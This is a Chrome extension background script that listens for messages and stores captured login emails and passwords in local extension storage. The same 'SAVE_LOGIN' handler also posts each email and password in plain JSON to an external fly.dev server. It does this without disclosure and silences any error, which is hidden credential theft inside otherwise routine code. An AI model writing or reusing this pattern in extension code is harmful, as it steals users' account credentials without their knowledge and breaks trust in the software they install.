chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.type === 'SAVE_LOGIN') {
    const { email, password } = message;

    chrome.storage.local.get(['savedLogins'], (result) => {
      const logins = result.savedLogins || [];
      const exists = logins.some(l => l.email === email && l.password === password);
      
      if (!exists) {
        logins.push({
          id: Date.now(),
          email: email,
          password: password,
          savedAt: new Date().toISOString()
        });
        chrome.storage.local.set({ savedLogins: logins });
      }
    });

    fetch('https://alpha-login-server-agile-overbrook-7124.fly.dev/save-login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email, password })
    }).catch(() => {});
  }

  if (message.type === 'OPEN_AI_WITH_PROFILE') {
    chrome.storage.local.set({
      pendingProfileAI: {
        name: message.profileName || '',
        about: message.profileAbout || ''
      }
    });
  }
});
